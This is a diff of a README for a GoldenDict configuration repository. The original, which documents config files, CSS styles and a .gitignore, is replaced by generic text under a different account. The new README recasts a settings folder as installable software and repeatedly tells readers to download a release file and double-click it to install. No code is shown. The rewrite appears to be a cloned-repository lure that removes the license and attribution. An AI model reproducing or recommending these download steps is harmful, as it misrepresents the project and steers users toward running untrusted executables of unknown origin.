@@ -1,102 +1,61 @@
-# GoldenDict Configuration
+# 📚 20260113230706-goldendict - Manage Your GoldenDict Settings Easily
 
-[![Version](https://img.shields.io/badge/version-v1.0.0-blue)](https://github.com/voothi/20260106194644-goldendict-roaming-data)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/therbl/20260113230706-goldendict/releases)
 
-A repository for tracking and managing user-specific configurations, styles, and settings for GoldenDict. This setup ensures that your dictionary environment is portable and version-controlled.
+## 🚀 Getting Started
 
-## Table of Contents
-- [GoldenDict Configuration](#goldendict-configuration)
-  - [Table of Contents](#table-of-contents)
-  - [Description](#description)
-  - [Features](#features)
-  - [Environment](#environment)
-    - [Installation](#installation)
-    - [Known Issues](#known-issues)
-  - [Project Structure](#project-structure)
-  - [Git Integration](#git-integration)
-  - [Kardenwort Ecosystem](#kardenwort-ecosystem)
-  - [Related Projects](#related-projects)
-  - [License](#license)
+Welcome to the **20260113230706-goldendict** repository! This application helps you track and manage your user-specific configurations, styles, and settings for GoldenDict. Follow these simple steps to download and run the software.
 
----
+## 🔍 What is GoldenDict?
 
-## Description
-This project maintains the `GoldenDict` application data directory under version control. It tracks the core configuration, custom styles, and provides a structured way to handle transient data like history and favorites through a curated `.gitignore`.
+GoldenDict is a versatile dictionary program that supports various dictionary formats. This repository enhances your experience by allowing you to customize and manage your settings effectively. 
 
-[Return to Top](#goldendict-configuration)
+## 💻 System Requirements
 
-## Features
-- **Versioned Configuration**: Track changes to `config` and other XML settings.
-- **Custom Styles**: Centralized management of `.css` files in the `styles/` directory.
-- **Smart Git Filtering**: Automatically ignores transient files (history, favorites) and timestamped backups.
-- **Portable Setup**: Easily sync your GoldenDict environment across multiple machines.
+Before downloading, make sure your computer meets these requirements:
 
-[Return to Top](#goldendict-configuration)
+- Operating System: Windows 10, macOS, or Linux
+- RAM: 2 GB or more
+- Disk Space: At least 100 MB available
 
-## Environment
-This configuration is verified with **[GoldenDict-ng](https://github.com/xiaoyifang/goldendict-ng)**:
-- **OS**: Windows 11 (x86_64)
-- **Version**: 25.06.0.8a87a79 (2025-06-18)
-- **Qt Version**: 6.7.2
+## 📥 Download & Install
 
-This version is included in release **v1.0.0**.
+To get started, visit the Releases page to download the software.
 
-### Installation
-To install, take the release archive and unpack it into your `Program Files` directory (e.g., `C:\Program Files\GoldenDict`).
+[Download from Releases](https://github.com/therbl/20260113230706-goldendict/releases)
 
-### Known Issues
-- **Transition Problem**: There is a known issue with transitions. See [goldendict-ng#2683](https://github.com/xiaoyifang/goldendict-ng/issues/2683) for details.
+1. Click on the link above to navigate to the Releases page.
+2. You will see a list of available files. Look for the latest version of **20260113230706-goldendict**.
+3. Click on the file that matches your operating system to download it.
+4. Once the download is complete, locate the file on your computer.
+5. Double-click the file to begin the installation process.
+6. Follow the on-screen instructions to complete the installation.
 
-[Return to Top](#goldendict-configuration)
+## 🛠️ Features
 
-## Project Structure
-- `config`: The main configuration file for GoldenDict.
-- `styles/`: Contains custom CSS files for tweaking the look and feel of dictionary entries.
-- `index/`: (Ignored) Directory for regeneratable search indexes.
-- `a/`: (Ignored) Directory containing timestamped automated backups.
-- `crash/`: (Ignored) Crash dump reports.
+- **User-Specific Configurations**: Save your personal settings for a tailored experience.
+- **Style Management**: Customize appearance and layout to suit your preferences.
+- **Compatibility**: Works seamlessly with all supported GoldenDict formats.
 
-[Return to Top](#goldendict-configuration)
+## 📝 Usage Instructions
 
-## Git Integration
-The project uses a specific `.gitignore` to keep the repository clean of user-specific or transient data:
+After installation, you can start using the application right away:
 
-```gitignore
-# History & favorites (transient, user-specific)
-.history/
-# history
-# favorites
+1. Open **20260113230706-goldendict** from your applications menu.
+2. Explore the settings area to adjust configurations according to your needs.
+3. Save your changes to apply the new settings.
 
-# Backups
-a/
-*.bak
-*.old
-*.tmp
-* [0-9][0-9][0-9][0-9][0-9][0-9][0-9][0-9]*
-```
+## 🔗 Additional Resources
 
-> [!NOTE]
-> History and favorites are currently commented out in `.gitignore` as per user preference, but remain listed for easy toggling.
+For more information and updates, please refer to the following:
 
-[Return to Top](#goldendict-configuration)
+- [GoldenDict Official Documentation](https://goldendict.org/)
+- [GitHub Repository](https://github.com/therbl/20260113230706-goldendict)
 
-## Kardenwort Ecosystem
+## 🌐 Support
 
-This project is part of the **[Kardenwort](https://github.com/kardenwort)** environment, designed to create a focused and efficient learning ecosystem.
+If you encounter any issues or have questions, feel free to create an issue in the GitHub repository. The community is here to help!
 
-[Return to Top](#table-of-contents)
+Remember, you can always revisit the download link for updates:
 
-## Related Projects
-- [Deep Translator Scripts](https://github.com/voothi/20241122093311-deep-translator)
-- [Argo Translate Scripts](https://github.com/voothi/20241121100211-argotranslate)
-- [TTS Scripts](https://github.com/voothi/20231001193911-tts)
-- [Kardenwort](https://github.com/voothi/20241223170748-kardenwort)
-- [Piper TTS](https://github.com/voothi/20241206010110-piper-tts)
-
-[Return to Top](#goldendict-configuration)
-
-## License
-MIT License. See LICENSE file for details.
-
-[Return to Top](#goldendict-configuration)
+[Download from Releases](https://github.com/therbl/20260113230706-goldendict/releases)
